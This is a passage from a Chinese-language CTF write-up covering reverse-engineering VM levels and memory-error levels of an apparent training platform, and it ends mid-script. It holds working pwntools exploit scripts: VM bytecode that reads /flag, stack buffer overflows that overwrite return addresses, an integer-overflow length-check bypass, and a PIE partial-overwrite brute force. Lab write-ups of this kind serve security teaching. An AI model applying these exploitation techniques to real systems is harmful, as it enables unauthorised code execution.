0x&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(des_reg(arg1), arg2)<br>            <span class="hljs-built_in">print</span>(return_info)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure>
<p>​	然后这里我删去了0x88，0x89的两个数据，总共发送6个数据成功。这里怀疑对于长度存在限制。下面就是关键比较位置的指令打印，这里a就是输入(输入123465789)，b就是内置比较数据，他们一开始比较最后一个位置，即0x8f，然后往前比较。这里0x36对应的数据是6，可以验证接收的输入长度为6，同时猜测这里的c就是长度。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x36</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x7c</span> <span class="hljs-selector-tag">c</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x06</span> <span class="hljs-selector-tag">d</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xff</span> <span class="hljs-selector-tag">s</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x08</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xc6</span> <span class="hljs-selector-tag">f</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x00</span><br><span class="hljs-selector-attr">[I]</span> <span class="hljs-selector-tag">op</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x08</span>  <span class="hljs-selector-tag">arg1</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x01</span>  <span class="hljs-selector-tag">arg2</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x20</span><br><span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-tag">CMP</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure>
<p>​	再后面的指令中找到跳转条件是判断c，可以肯定c就是数据长度。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x35</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x8f</span> <span class="hljs-selector-tag">c</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x00</span> <span class="hljs-selector-tag">d</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x58</span> <span class="hljs-selector-tag">s</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x05</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xba</span> <span class="hljs-selector-tag">f</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x11</span><br><span class="hljs-selector-attr">[I]</span> <span class="hljs-selector-tag">op</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x10</span>  <span class="hljs-selector-tag">arg1</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x04</span>  <span class="hljs-selector-tag">arg2</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x10</span><br><span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-tag">JMP</span> <span class="hljs-selector-tag">Z</span> <span class="hljs-selector-tag">c</span><br>    <span class="hljs-selector-attr">[j]</span> ... <span class="hljs-selector-tag">TAKEN</span><br></code></pre></td></tr></table></figure>
<h2 id="level-20"><a class="markdownIt-Anchor" href="#level-20"></a> level 20</h2>
<p>​	这里和 level 19 差不多，不同点在于它是先把输入加一个数然后进行比较，这个最后比较的数据没有直接给出，而是比对一个成功才给出下一个比较。感觉可以爆破一下，用返回数据来查看数值是否正确。总共0xe个数据，我就直接从后面一个一个输入比对了。</p>
<p>​	经过对于 20.1 的调试，发现最后数据存在于栈中，只要在动调中根据偏移来寻找即可。</p>
<h2 id="level-21"><a class="markdownIt-Anchor" href="#level-21"></a> level 21</h2>
<p>​	这里就是要求使用程序的规则来写汇编了。贴一个 21.0 的代码，主要还是借鉴 level 19 的查看&quot;/flag&quot;的方法。而 21.1 则是改变了寄存器的位置，同时将参数1，2的位置颠倒了，需要根据程序进行分析。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyrev_level[0-9][0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br><br><span class="hljs-comment"># 8 a, 64 b, 4 c, 1 d, 16 s, 32 i, 2 f</span><br>open_flag = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x2f</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># /   0x2f  -&gt; IMM d 0x2f, IMM c = 0x80, STM *c = d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x81</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># f         -&gt; 这里都是赋予&quot;/flag&quot;,然后open打开这个地址</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x6c</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x82</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># l</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x83</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># a</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x67</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x84</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># g</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x85</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># 0截断</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x1</span>       <span class="hljs-comment"># open打开  -&gt; IMM a = 0x80, IMM b = 0, SYS 0x10(open) d</span><br>]       <span class="hljs-comment">#三个 op arg1 arg2</span><br>read_len = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x10</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0xff</span>,     <span class="hljs-comment"># IMM c = 0xff</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM a = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># ADD a d</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>      <span class="hljs-comment"># SYS 0x4(read memory) d </span><br>]<br>write_to_terminal = [<br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x10</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x00</span>,     <span class="hljs-comment"># IMM c = 0</span><br>    <span class="hljs-number">0x40</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># ADD c d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x01</span>,     <span class="hljs-comment"># IMM a = 0x1</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>      <span class="hljs-comment"># SYS 0x10(write) d</span><br>] <br>bytes_list = <span class="hljs-built_in">bytes</span>(open_flag + read_len + write_to_terminal + [<span class="hljs-number">0x80</span>])  <span class="hljs-comment"># 后面的0x80是为了报错返回，防止一直无限循环(没写调用exit的简单处理方法)</span><br>r.send(bytes_list)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-22"><a class="markdownIt-Anchor" href="#level-22"></a> level 22</h2>
<p>​	对于 22.0 ，就是根据它的响应值来判断寄存器和指令的位置及作用。指令很少，一个一个尝试就出来了，下面注释就是具体的指令指代。然后按照上一次的相关指令即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyrev_level[0-9][0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br><br><span class="hljs-comment"># 三个 arg1 op arg2</span><br><br><span class="hljs-comment"># 0x1 CMP, 0x2 IMM, 0x4 IDM, 0x8 ADD, 0x10 STM, 0x20 STK, 0x80 SYS # 0x40应该是JMP</span><br><span class="hljs-comment"># 0x1 c,   0x2 f  , 0x4 b  , 0x8 i  , 0x10 a  , 0x20 d  , 0x80 s # 0x80存疑，只有7个寄存器，最高为0x40</span><br><br><span class="hljs-comment"># SYS arg1 -&gt; 0x1 open, 0x2 write, 0x4 sleep, 0x20 read_code, 0x40 exit, 0x80 read_memory </span><br><span class="hljs-comment"># IMM --&gt; des(arg1) = arg2</span><br><span class="hljs-comment"># STM --&gt; *des(arg1) = des(arg2)</span><br><span class="hljs-comment"># ADD --&gt; des(arg1) += des(arg2)</span><br><span class="hljs-comment"># SYS --&gt; arg1 des(arg2)</span><br>open_flag = [<br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x2f</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># /   0x2f  -&gt; IMM d 0x2f, IMM c = 0x80, STM *c = d</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x66</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x81</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># f         -&gt; 这里都是赋予&quot;/flag&quot;,然后open打开这个地址</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x6c</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x82</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># l</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x61</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x83</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># a</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x67</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x84</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># g</span><br>    <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,  <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x85</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># 0截断</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>, <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>, <span class="hljs-number">0x1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>       <span class="hljs-comment"># open打开  -&gt; IMM a = 0x80, IMM b = 0, SYS 0x11(open) d</span><br>] <br>read_len = [<br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x80</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xff</span>,     <span class="hljs-comment"># IMM c = 0xff</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,     <span class="hljs-comment"># IMM a = 0</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x20</span>,    <span class="hljs-comment"># ADD a d</span><br>    <span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>    <span class="hljs-comment"># SYS 0x80(read memory) d </span><br>]<br>write_to_terminal = [<br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM b = 0</span><br>    <span class="hljs-number">0x4</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x80</span>,     <span class="hljs-comment"># ADD b s</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,      <span class="hljs-comment"># IMM c = 0</span><br>    <span class="hljs-number">0x1</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x20</span>,     <span class="hljs-comment"># ADD c d</span><br>    <span class="hljs-number">0x10</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x01</span>,    <span class="hljs-comment"># IMM a = 0x1</span><br>    <span class="hljs-number">0x2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>     <span class="hljs-comment"># SYS 0x2(write) d</span><br>] <br>exit = [<span class="hljs-number">0x40</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x20</span>] <span class="hljs-comment"># SYS 0x40(exit) d</span><br>bytes_list = <span class="hljs-built_in">bytes</span>(open_flag+read_len+write_to_terminal+exit)<br>r.send(bytes_list)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="memory-errors"><a class="markdownIt-Anchor" href="#memory-errors"></a> Memory Errors</h1>
<h2 id="基础知识-3"><a class="markdownIt-Anchor" href="#基础知识-3"></a> 基础知识</h2>
<ul>
<li>
<p>C 将数据和指令混合在一起，同时不对非法访问做出错误响应，这也就导致存在内存错误问题。</p>
</li>
<li>
<p>存在的问题</p>
<ul>
<li>不存储长度信息导致数据覆盖</li>
<li>栈溢出</li>
<li>整数溢出</li>
</ul>
</li>
<li>
<p>编译 <code>gcc -fno-stack-protector -no-pie file.c -o file</code> 允许栈可执行与没有pie</p>
</li>
</ul>
<h3 id="canary"><a class="markdownIt-Anchor" href="#canary"></a> canary</h3>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/613650807">参考: CTFer成长日记13：Canary的基本原理与绕过 - 知乎 (zhihu.com)</a></p>
<h3 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h3>
<table>
<thead>
<tr>
<th></th>
<th>作用位置</th>
<th>归属</th>
<th>作用时间</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASLR</td>
<td>随机化栈基地址(stack)、共享库(.so\libraries)、mmap 基地址，增加随机化堆基地址(chunk)</td>
<td>系统功能</td>
<td>作用于程序(ELF)装入内存运行时</td>
</tr>
<tr>
<td>PIE</td>
<td>随机化代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)</td>
<td>编译器功能</td>
<td>作用于程序(ELF)编译过程中</td>
</tr>
</tbody>
</table>
<ul>
<li>禁用aslr
<ul>
<li><code>pwn.process(&quot;./file&quot;,aslr=False)</code></li>
<li>gdb如果有权限的话，它默认就会禁用aslr。而对于有suid权限的程序，需要先去除这个权限(比如移动位置等)再调试</li>
<li>启动一个新的禁用aslr的shell，<code>setarch x86_64 -R /bin/bash</code></li>
</ul>
</li>
</ul>
<h3 id="数据泄露"><a class="markdownIt-Anchor" href="#数据泄露"></a> 数据泄露</h3>
<ul>
<li>一个gcc的优化，<code>gcc -o file file.c -03 -fno-inline</code>(-fno-inlie禁用使内联函数堆栈对齐)–这里针对于内存不清除的问题，若是之后在清除内存，然后编译器有很高的优化会忽略这些清理的语句，从而再次导致内存泄露问题。这里提醒在使用变量之前需要先初始化代码中的变量</li>
</ul>
<h2 id="level-1-2"><a class="markdownIt-Anchor" href="#level-1-2"></a> level 1</h2>
<blockquote>
<p>就是溢出覆盖，多输入点数据即可</p>
</blockquote>
<h2 id="level-2-2"><a class="markdownIt-Anchor" href="#level-2-2"></a> level 2</h2>
<blockquote>
<p>需要按要求进行覆盖</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>payload_size = <span class="hljs-string">b&quot;123&quot;</span><span class="hljs-comment">#这个是自己payload的输入长度</span><br>r.send(payload_size)<br>r.send(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">65</span>+p64(<span class="hljs-number">0x06e85456</span>))<span class="hljs-comment">#前面65个是填充，不过按理来说64个应该可以的，但是不知道为什么需要65个，怀疑是第一个&quot;A&quot;用于换行而被吞了。之后使用sendline就没有这个问题 </span><br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-3-2"><a class="markdownIt-Anchor" href="#level-3-2"></a> level 3</h2>
<blockquote>
<p>覆盖返回地址</p>
</blockquote>
<p>​	主要看存储 read 数据的变量在栈中给的位置，<code>__int64 v9[12]; // [rsp+30h] [rbp-80h] BYREF</code> 这里就是看距离rbp的距离，也就是80h(栈是从高地址向低地址扩展，最后要覆盖rbp前面的返回地址)，然后再加上 <code>push rbp</code> 的8字节和吞了的1字节即可。</p>
<h2 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2"></a> level 4</h2>
<blockquote>
<p>依旧覆盖返回地址，但是限制了输入长度，需要整数溢出</p>
</blockquote>
<p>​	这里限制了 nbytes &lt;= 0x45，但是可以用 <code>-1</code> 进行绕过，因为它使用的是 <code>jle</code> 这个比较的是有符号数据。<code>jbe</code> 才是无符号数据的小于跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x40272f &lt;challenge+779&gt;:    cmp    eax,0x45 # 这里eax被赋值为0xffffffff，它有符号数据为-1<br>0x402732 &lt;challenge+782&gt;:    jle    0x40274a &lt;challenge+806&gt; #-1小于0x45，这里会直接跳转，成功绕过长度限制<br></code></pre></td></tr></table></figure>
<p>​	同时注意这里 read 读取的 buf 是从 nbytes + 4 开始的，也就是从 <code>[rbp - 64h + 4]</code> 开始( + 远离 rbp)。</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402151534213.png" srcset="/img/loading.gif" lazyload alt="image-20240215153443126" /></p>
<h2 id="level-5-2"><a class="markdownIt-Anchor" href="#level-5-2"></a> level 5</h2>
<blockquote>
<p>依旧是整数溢出问题，一开始理解的就有问题(被常见的-1回绕影响了判断)，最后直接构造就可以了</p>
</blockquote>
<p>​	主要问题就是下面的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">  unsigned int v8; // [rsp+28h] [rbp-48h] BYREF<br>  unsigned int v9; // [rsp+2Ch] [rbp-44h] BYREF		#这里是两个输入的数值，可以发现都为为32位<br><br>.text:00000000004028BA mov     edx, [rbp+var_48]<br>.text:00000000004028BD mov     eax, [rbp+var_44]<br>.text:00000000004028C0 imul    eax, edx<br>.text:00000000004028C3 cmp     eax, 7<br>.text:00000000004028C6 jbe     short loc_4028E7		# 这里的乘积不能大于7<br><br>.text:00000000004028E7 mov     eax, [rbp+var_44]<br>.text:00000000004028EA mov     eax, eax<br>.text:00000000004028EC mov     [rbp+nbytes], rax<br>.text:00000000004028F0 mov     eax, [rbp+var_48]<br>.text:00000000004028F3 mov     edx, eax<br>.text:00000000004028F5 mov     rax, [rbp+nbytes]<br>.text:00000000004028F9 imul    rax, rdx<br>.text:00000000004028FD mov     [rbp+nbytes], rax<br>.text:0000000000402901 mov     rax, [rbp+nbytes]	# 这里是获得可以输入的长度<br><br>.text:0000000000402A4D call    _read				# 上面的 nbytes 如果大于0x7fffffff ffffffff，那么后面的eax就会被赋值为0xffffffff ffffffff而报错<br>.text:0000000000402A52 mov     [rbp+var_14], eax<br>.text:0000000000402A55 cmp     [rbp+var_14], 0<br>.text:0000000000402A59 jns     short loc_402A87		# 这里read的返回值大小被限制，不能超过0x80000000<br></code></pre></td></tr></table></figure>
<p>​	这里一直出现 <code>Bad Address</code> 的问题，这时因为 nbytes 不能超过<code>0x7fffffff ffffffff</code>。所以现在可以得到结果，这里需要两个32位数据相乘低32位小于7，然后64位乘积不大于SSIZE_MAX。简单而言，需要低32位小于7，然后高32位在0x1~0x7fffffff之间。一开始还想着-1什么的来搞，但是回绕太大卡住了，后面又认为这个数据要一个一个试，要爆破很久，所以一直卡住。后来突然意识到可以字节构造(利用溢出特性)，直接用<code>0x1 0000 0002</code>来作为乘积的结果，然后就能得到两个乘数 <code>0x8000 0001</code> 和 <code>0x2</code> ，然后就可以过了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Number of payload records to send: &quot;</span>,<span class="hljs-string">b&#x27;2147483649&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Size of each payload record: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)	<span class="hljs-comment"># 相乘可以满足条件</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0X402471</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-7-2"><a class="markdownIt-Anchor" href="#level-7-2"></a> level 7</h2>
<blockquote>
<p>开启了 PIE 保护</p>
</blockquote>
<p>​	由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的，它们不会受到随机化的影响。因此通过覆盖EIP(这里是返回地址的地方)的后<strong>8到16位</strong>(按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babymem_level[0-9].[0-9]&quot;</span>)<br><br>interval = <span class="hljs-number">0x60</span>	<span class="hljs-comment"># 直接是[rbp-nh]中的n</span><br>table = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-number">0x10</span>):<br>    table.append(i)<br><br><span class="hljs-keyword">while</span> <span 